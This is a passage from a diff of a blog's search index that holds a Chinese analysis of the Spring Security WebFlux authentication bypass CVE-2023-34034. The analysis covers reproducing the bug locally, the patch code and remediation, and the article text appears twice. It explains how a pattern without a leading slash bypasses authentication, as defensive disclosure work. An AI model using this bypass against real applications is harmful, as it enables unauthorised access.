+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.14<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ssawt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>SpringSecurityAndWebfluxTest<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>SpringSecurityAntWebfluxTest<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-security<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-webflux<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里使用spring-boot-starter-parent版本为2.6.14，其依赖的Spring Security版本为5.6.9，为存在漏洞版本；</p>
+<p>为了对比，使用spring-boot-starter-parent版本2.7.14作为漏洞修复版本，其依赖的Spring Security 版本为5.7.10，为修复版本。</p>
+<p>为了能够进行漏洞复现，我们需要使用WebFlux编写一部分代码，并使用Spring Security作为认证框架。</p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822100900918.png" alt="image-20230822100900918"></p>
+<p>上图是调试代码的结构，我们使用Spring Boot来搭建项目，并编写了一个控制器<code>HelloController</code>，该控制器中定义了一个路由处理方法，即所有访问<code>http://127.0.0.1:8080/hello-dev/xxxx</code>的请求都由该方法进行处理。</p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822101052260.png" alt="image-20230822101052260"></p>
+<p>另外设置了5个响应处理器，分别对无访问权限、未认证、认证失败、认证成功、登出成功的情况进行处理。在<code>AuthorizationConfig</code>中定义了基于内存的用户名密码以及路由规则</p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822101411599.png" alt="image-20230822101411599"></p>
+<p>关于如何在WebFlux中使用Spring Security可以参考该文章：<a href="https://juejin.cn/post/7220662065294770233">https://juejin.cn/post/7220662065294770233</a></p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>一般来说，对于只有漏洞编号的漏洞，我们若要进行复现，第一步需要做的就是进行信息收集，信息收集是为了达成以下几个目的：</p>
+<ul>
+<li>获取官方或者第三方漏洞通告中关于漏洞描述的蛛丝马迹，这些通告中的漏洞描述往往泄露大量的信息；</li>
+<li>是否已有安全研究员披露漏洞详情；</li>
+<li>漏洞是否修复，修复的Commit ID是多少。</li>
+</ul>
+<p>对于该漏洞来说，Spring 官方发布了一则通告：</p>
+<p><a href="https://spring.io/security/cve-2023-34034">https://spring.io/security/cve-2023-34034</a></p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822102006591.png" alt="image-20230822102006591"></p>
+<p>在该漏洞描述中提到，在WebFlux中为Spring Security配置使用”**”这种模式的正则将导致Spring Security 与 Spring WebFlux的行为不一致从而导致认证绕过。这里可以提取到一个关键点就是需要在Spring Security中使用”**&quot;进行模式匹配才会导致漏洞。当然这点信息可能不太够，所以我们继续搜索，于是发现了下面这篇帖子：</p>
+<p><a href="https://www.oschina.net/news/249933">https://www.oschina.net/news/249933</a></p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822102343166.png" alt="image-20230822102343166"></p>
+<p>这篇帖子里已经由关于该漏洞较多的信息泄露了。原来在Spring Security中”**“不能匹配路径分隔符”&#x2F;“，而在Spring WebFlux中却可以匹配路径分隔符。</p>
+<p>可能看到这里，我们对具体的绕过姿势还不是特别清楚。在该通告的最后提供了该漏洞的修复记录：</p>
+<p><a href="https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780">https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780</a></p>
+<p>在该修复记录中，增加了一处测试代码：</p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822102847635.png" alt="image-20230822102847635"></p>
+<p>该测试模拟了一个HTTP请求”&#x2F;user&#x2F;test“，然后将其与路径模式”user&#x2F;**“进行比较，如果比较结果为<code>True</code>则测试通过。那么我们想想，这是不是说漏洞没有修复前这个比较结果为False，也就是说对于没有前导”&#x2F;“并使用了”**“的路径模式是不能匹配带前导”&#x2F;“的路径的？怀着这样的想法，我们修改我们的调试环境代码进行测试。</p>
+<p>在控制器中设置一个不带前导”&#x2F;“的路径模式</p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822103307585.png" alt="image-20230822103307585"></p>
+<p>同样在Spring Security中也设置一个同样不带前导”&#x2F;“的路径模式，两者保持一致，且访问该路径需要进行权限校验，并且其余所有的请求都不需要认证</p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822103337537.png" alt="image-20230822103337537"></p>
+<p>此时将程序运行起来，然后访问<code>http://127.0.0.1:8080/hello-dev/test</code></p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822103649543.png" alt="image-20230822103649543"></p>
+<p>发现WebFlux正确地匹配到了该路径，但Spring Security却并没有匹配到（若匹配到应提示进行未登录），这正好印证了漏洞描述中说的Spring Security与Spring WebFlux匹配规则不一致的问题。为了进一步确认，我们在Spring Security认证代码中增加前导”&#x2F;“</p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822103935948.png" alt="image-20230822103935948"></p>
+<p>再次访问<code>http://127.0.0.1:8080/hello-dev/test</code></p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822104027172.png" alt="image-20230822104027172"></p>
+<p>响应结果提示未登录了。至此，我们已经了解了该漏洞的表现形式以及利用方法。要完成该漏洞的利用需要程序员错误的Spring Security 路径模式设置，即未给路径添加前导”&#x2F;“，想来这种情况是比较少见的，所以该漏洞的影响其实是有限的。</p>
+<p>知道了漏洞的表征，我们仍需要查看一下补丁以确认该漏洞是否真如我们猜想的这样，在<code>config/src/main/java/org/springframework/security/config/web/server/AbstractServerWebExchangeMatcherRegistry.java</code> 中新增了以下代码。</p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822104416434.png" alt="image-20230822104416434"></p>
+<p>该修改主要修改了<code>pathMatchers(java.lang.String...)</code>方法的实现逻辑，在进行路径匹配前首先调用了<code>parsePatterns</code>方法对路径模式进行解析。<code>parsePatterns</code>方法先获取到一个默认的路径模式解析器<code>parser</code>，然后调用其<code>initFullPathPattern</code>方法：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">initFullPathPattern</span><span class="params">(String pattern)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> StringUtils.hasLength(pattern) &amp;&amp; !pattern.startsWith(<span class="string">&quot;/&quot;</span>) ? <span class="string">&quot;/&quot;</span> + pattern : pattern;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>该方法判断传入的路径模式的长度若不为0，则判断其是否以”&#x2F;“开头，若不是则添加前导”&#x2F;“，即强制路径模式以”&#x2F;“开头，从而避免了该漏洞。</p>
+<p>另一方面既然存在漏洞版本的Spring WebFlux能够正确解析无前导”&#x2F;“的情况，我们仍需看看其解析逻辑。Spring WebFlux在扫描Controller时会依次扫描各方法的注解，而这些注解的处理类在<code>org.springframework.web.reactive.result.method.annotation</code>包下面，而处理<code>RequestMapping</code>的处理器为<code>RequestMappingHandlerMapping</code>，在Bean装载时最终会调用到其<code>createRequestMappingInfo</code>方法。</p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822142906974.png" alt="image-20230822142906974"></p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822143112720.png" alt="image-20230822143112720"></p>
+<p>该方法首先会解析element是否含有RequestMapping这个注解，element是一个Method对象。如果有再调用<code>createRequestMappingInfo</code>的重载方法。</p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822143204862.png" alt="image-20230822143204862"></p>
+<p>在该方法中首先会创建一个builder，其封装了RequestMapping设置的请求方法、路径、参数、请求头等条件，然后调用build方法准备构建一个<code>RequestMappingInfo</code>对象。</p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822143515644.png" alt="image-20230822143515644"></p>
+<p>注意到此时设置的路径匹配模式仍然没有发生变化，在调用parse方法后会发生什么？</p>
+<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822143646588.png" alt="image-20230822143646588"></p>
+<p>parse方法会判断路径匹配模式是否一”&#x2F;“开头，若不是则补充。如此便能正常地进行路径匹配，这与存在漏洞的Spring Security版本处理逻辑不同，故两者的差异导致了漏洞产生。</p>
+<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
+<li>升级软件到不受影响的版本或最新版，官方仓库地址：<a href="https://github.com/spring-projects/spring-security/%EF%BC%9B">https://github.com/spring-projects/spring-security/；</a></li>
+<li>规范编码，避免不规范的路径匹配模式。</li>
+</ol>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34034">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34034</a></li>
+<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-34034">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-34034</a></li>
+<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-34034">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-34034</a></li>
+<li><a href="https://spring.io/security/cve-2023-34034">https://spring.io/security/cve-2023-34034</a></li>
+<li><a href="https://www.oschina.net/news/249933">https://www.oschina.net/news/249933</a></li>
+<li><a href="https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780">https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>漏洞分析</tag>
+        <tag>漏洞</tag>
+        <tag>WebFlux Security</tag>
+        <tag>CVE-2023-34034</tag>
+        <tag>认证绕过</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Spring Kafka 消息头反序列化漏洞（CVE-2023-34040）</title>
     <url>/2025/04/10/Spring-Kafka%E6%B6%88%E6%81%AF%E5%A4%B4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2023-34040/</url>
     <content><![CDATA[<h1 id="Spring-Kafka消息头反序列化漏洞（CVE-2023-34040）"><a href="#Spring-Kafka消息头反序列化漏洞（CVE-2023-34040）" class="headerlink" title="Spring Kafka消息头反序列化漏洞（CVE-2023-34040）"></a>Spring Kafka消息头反序列化漏洞（CVE-2023-34040）</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>Spring for Apache Kafka (Spring - Kafka)项目将Spring的核心概念应用于基于Kafka的消息传递解决方案的开发。它提供了一个“template”作为发送消息的高级抽象。它还支持带有@KafkaListener注解和“listener container”的消息驱动POJOs 。这些库提倡使用依赖注入和声明式的使用方式。所有这些例子都与Spring框架的JMS支持和Spring AMQP对RabbitMQ的支持有相似之处。</p>
@@ -810,103 +907,6 @@
         <tag>漏洞</tag>
         <tag>Spring Kafka</tag>
         <tag>CVE-2023-34040</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>WebFlux Security 认证绕过（CVE-2023-34034）</title>
-    <url>/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/</url>
-    <content><![CDATA[<h1 id="WebFlux-Security-认证绕过（CVE-2023-34034）"><a href="#WebFlux-Security-认证绕过（CVE-2023-34034）" class="headerlink" title="WebFlux Security 认证绕过（CVE-2023-34034）"></a>WebFlux Security 认证绕过（CVE-2023-34034）</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>Spring WebFlux 是 Spring Framework 5.0 中引入的新的响应式Web框架。与Spring MVC不同，它不需要Servlet API，是完全异步且非阻塞的，并且通过Reactor项目实现了Reactive Streams规范。Spring WebFlux 可用于创建基于事件循环执行模型的完全异步且非阻塞的应用程序。</p>
-<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>当WebFlux使用了Spring Security进行用户认证与鉴权时，若错误地使用了无前导”&#x2F;“的路径通配符”**“，程序将因为WebFlux与Spring Security对其不同的解析模式差异导致可能的认证绕过。</p>
-<span id="more"></span>
-
-<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><ul>
-<li>6.1.0 to 6.1.1</li>
-<li>6.0.0 to 6.0.4</li>
-<li>5.8.0 to 5.8.4</li>
-<li>5.7.0 to 5.7.9</li>
-<li>5.6.0 to 5.6.11</li>
-</ul>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入相关依赖包</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.14<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ssawt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>SpringSecurityAndWebfluxTest<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>SpringSecurityAntWebfluxTest<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-security<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-webflux<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这里使用spring-boot-starter-parent版本为2.6.14，其依赖的Spring Security版本为5.6.9，为存在漏洞版本；</p>
-<p>为了对比，使用spring-boot-starter-parent版本2.7.14作为漏洞修复版本，其依赖的Spring Security 版本为5.7.10，为修复版本。</p>
-<p>为了能够进行漏洞复现，我们需要使用WebFlux编写一部分代码，并使用Spring Security作为认证框架。</p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822100900918.png" alt="image-20230822100900918"></p>
-<p>上图是调试代码的结构，我们使用Spring Boot来搭建项目，并编写了一个控制器<code>HelloController</code>，该控制器中定义了一个路由处理方法，即所有访问<code>http://127.0.0.1:8080/hello-dev/xxxx</code>的请求都由该方法进行处理。</p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822101052260.png" alt="image-20230822101052260"></p>
-<p>另外设置了5个响应处理器，分别对无访问权限、未认证、认证失败、认证成功、登出成功的情况进行处理。在<code>AuthorizationConfig</code>中定义了基于内存的用户名密码以及路由规则</p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822101411599.png" alt="image-20230822101411599"></p>
-<p>关于如何在WebFlux中使用Spring Security可以参考该文章：<a href="https://juejin.cn/post/7220662065294770233">https://juejin.cn/post/7220662065294770233</a></p>
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>一般来说，对于只有漏洞编号的漏洞，我们若要进行复现，第一步需要做的就是进行信息收集，信息收集是为了达成以下几个目的：</p>
-<ul>
-<li>获取官方或者第三方漏洞通告中关于漏洞描述的蛛丝马迹，这些通告中的漏洞描述往往泄露大量的信息；</li>
-<li>是否已有安全研究员披露漏洞详情；</li>
-<li>漏洞是否修复，修复的Commit ID是多少。</li>
-</ul>
-<p>对于该漏洞来说，Spring 官方发布了一则通告：</p>
-<p><a href="https://spring.io/security/cve-2023-34034">https://spring.io/security/cve-2023-34034</a></p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822102006591.png" alt="image-20230822102006591"></p>
-<p>在该漏洞描述中提到，在WebFlux中为Spring Security配置使用”**”这种模式的正则将导致Spring Security 与 Spring WebFlux的行为不一致从而导致认证绕过。这里可以提取到一个关键点就是需要在Spring Security中使用”**&quot;进行模式匹配才会导致漏洞。当然这点信息可能不太够，所以我们继续搜索，于是发现了下面这篇帖子：</p>
-<p><a href="https://www.oschina.net/news/249933">https://www.oschina.net/news/249933</a></p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822102343166.png" alt="image-20230822102343166"></p>
-<p>这篇帖子里已经由关于该漏洞较多的信息泄露了。原来在Spring Security中”**“不能匹配路径分隔符”&#x2F;“，而在Spring WebFlux中却可以匹配路径分隔符。</p>
-<p>可能看到这里，我们对具体的绕过姿势还不是特别清楚。在该通告的最后提供了该漏洞的修复记录：</p>
-<p><a href="https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780">https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780</a></p>
-<p>在该修复记录中，增加了一处测试代码：</p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822102847635.png" alt="image-20230822102847635"></p>
-<p>该测试模拟了一个HTTP请求”&#x2F;user&#x2F;test“，然后将其与路径模式”user&#x2F;**“进行比较，如果比较结果为<code>True</code>则测试通过。那么我们想想，这是不是说漏洞没有修复前这个比较结果为False，也就是说对于没有前导”&#x2F;“并使用了”**“的路径模式是不能匹配带前导”&#x2F;“的路径的？怀着这样的想法，我们修改我们的调试环境代码进行测试。</p>
-<p>在控制器中设置一个不带前导”&#x2F;“的路径模式</p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822103307585.png" alt="image-20230822103307585"></p>
-<p>同样在Spring Security中也设置一个同样不带前导”&#x2F;“的路径模式，两者保持一致，且访问该路径需要进行权限校验，并且其余所有的请求都不需要认证</p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822103337537.png" alt="image-20230822103337537"></p>
-<p>此时将程序运行起来，然后访问<code>http://127.0.0.1:8080/hello-dev/test</code></p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822103649543.png" alt="image-20230822103649543"></p>
-<p>发现WebFlux正确地匹配到了该路径，但Spring Security却并没有匹配到（若匹配到应提示进行未登录），这正好印证了漏洞描述中说的Spring Security与Spring WebFlux匹配规则不一致的问题。为了进一步确认，我们在Spring Security认证代码中增加前导”&#x2F;“</p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822103935948.png" alt="image-20230822103935948"></p>
-<p>再次访问<code>http://127.0.0.1:8080/hello-dev/test</code></p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822104027172.png" alt="image-20230822104027172"></p>
-<p>响应结果提示未登录了。至此，我们已经了解了该漏洞的表现形式以及利用方法。要完成该漏洞的利用需要程序员错误的Spring Security 路径模式设置，即未给路径添加前导”&#x2F;“，想来这种情况是比较少见的，所以该漏洞的影响其实是有限的。</p>
-<p>知道了漏洞的表征，我们仍需要查看一下补丁以确认该漏洞是否真如我们猜想的这样，在<code>config/src/main/java/org/springframework/security/config/web/server/AbstractServerWebExchangeMatcherRegistry.java</code> 中新增了以下代码。</p>
-<p><img src="/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/image-20230822104416434.png" alt="image-20230822104416434"></p>
-<p>该修改主要修改了<code>pathMatchers(java.lang.String...)</code>方法的实现逻辑，在进行路径匹配前首先调用了<code>parsePatterns</code>方法对路径模式进行解析。<code>parsePatterns</code>方法先获取到一个默认的路径模式解析器<code>parser</code>，然后调用其<code>initFullPathPattern</code>方法：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">initFullPathPattern</span><span class="params">(String pattern)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> StringUtils.hasLength(pattern) &amp;&amp; !pattern.startsWith(<span class="string">&quot;/&quot;</span>) ? <span class="string">&quot;/&quot;</span> + pattern : pattern;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>该方法判断传入的路径模式的长度若不为0，则判断其是否以”&#x2F;“开头，若不是则添加前导”&#x2F;“，即强制路径模式以”&#x2F;“开头，从而避免了该漏洞。</p>
-<p>另一方面既然存在漏洞版本的Spring WebFlux能够正确解析无前导”&#x2F;“的情况，我们仍需看看其解析逻辑。Spring WebFlux在扫描Controller时会依次扫描各方法的注解，而这些注解的处理类在<code>org.springframework.web.reactive.result.method.annotation</code>包下面，而处理<code>RequestMapping</code>的处理器为<code>RequestMappingHandlerMapping</code>，在Bean装载时最终会调用到其<code>createRequestMappingInfo</code>方法。</p>
